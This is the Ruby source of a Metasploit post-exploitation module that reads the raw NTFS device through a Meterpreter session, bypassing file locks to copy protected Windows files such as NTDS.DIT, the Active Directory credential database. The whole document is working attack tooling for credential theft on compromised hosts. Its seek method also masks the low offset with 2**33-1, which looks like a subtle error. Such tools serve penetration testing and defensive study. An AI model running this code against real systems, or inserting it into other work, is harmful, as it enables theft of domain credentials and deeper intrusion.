##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class Metasploit3 < Msf::Post
  include Msf::Post::Windows::Priv
  require "rex/parser/fs/ntfs"

  def initialize(info = {})
    super(update_info(info,
      'Name'         => 'Windows File Gathering In Raw NTFS',
      'Description'  => %q{
          This module gather file using the raw NTFS device, bypassing some Windows restriction.
          Gather file from disk bypassing restriction like already open file with write right lock.
          Can be used to retreive file like NTDS.DIT
      },
      'License'      => 'MSF_LICENSE',
      'Platform'     => ['win'],
      'SessionTypes' => ['meterpreter'],
      'Author'       => ['Danil Bazin <danil.bazin[at]hsc.fr>'], #@danilbaz
      'References'   => [
        [ 'URL', 'http://www.amazon.com/System-Forensic-Analysis-Brian-Carrier/dp/0321268172/' ]
      ]
    ))
    register_options(
      [
        OptString.new('FILE', [true, 'The FILE to retreive from the Volume raw device', ""])
      ], self.class)
  end

  def run
    winver = sysinfo["OS"]

    if winver =~ /2000/i
      print_error("Module not valid for Windows 2000")
      return
    end

    unless is_admin?
      print_error("You don't have enough privileges")
      return
    end

    file = datastore['FILE']
    drive = file[0, 2]

    r = client.railgun.kernel32.CreateFileA("\\\\.\\#{drive}", "GENERIC_READ", "FILE_SHARE_DELETE|FILE_SHARE_READ|FILE_SHARE_WRITE",
                                            nil, "OPEN_EXISTING", "FILE_FLAG_WRITE_THROUGH", 0)

    if r['GetLastError'] != 0
      print_error("Error opening #{drive} GetLastError=#{r['ErrorMessage']}")
      return nil
    end
    @handle = r['return']
    print_status("Successfuly opened #{drive}")

    fs = Rex::Parser::NTFS.new(self)

    data = fs.file(file[3, file.length - 3])
    file_name = file.split("\\")[-1]
    print_status("Saving file #{file_name}")
    file_result = ::File.new(file_name, "w")
    file_result.syswrite(data)
    file_result.close
    client.railgun.kernel32.CloseHandle(@handle)
    print_status("Post Successfuly")
  end

  def read(size)
    client.railgun.kernel32.ReadFile(@handle, size, size, 4, nil)["lpBuffer"]
  end

  def seek(offset)
    high_offset = offset >> 32
    low_offset = offset & (2**33 - 1)
    client.railgun.kernel32.SetFilePointer(@handle, low_offset, high_offset, 0)
  end
end
